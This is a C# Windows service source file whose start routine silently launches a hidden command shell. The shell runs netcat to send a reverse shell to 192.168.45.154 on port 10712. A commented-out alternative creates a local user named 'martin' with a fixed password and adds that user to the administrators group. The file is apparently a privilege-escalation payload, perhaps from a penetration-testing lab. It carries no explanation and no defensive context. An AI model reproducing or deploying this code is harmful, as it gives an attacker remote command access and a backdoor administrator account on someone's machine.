using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace WindowsService3
{
    public partial class Service3 : ServiceBase
    {
        public Service3()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            //startInfo.Arguments = "/C net user /add martin M4rt1nPwndY@ && net localgroup administrators martin /add";
            startInfo.Arguments = "/C C:\\users\\Public\\nc.exe -e cmd.exe 192.168.45.154 10712";
            process.StartInfo = startInfo;
            process.Start();
        }

        protected override void OnStop()
        {
        }
    }
}
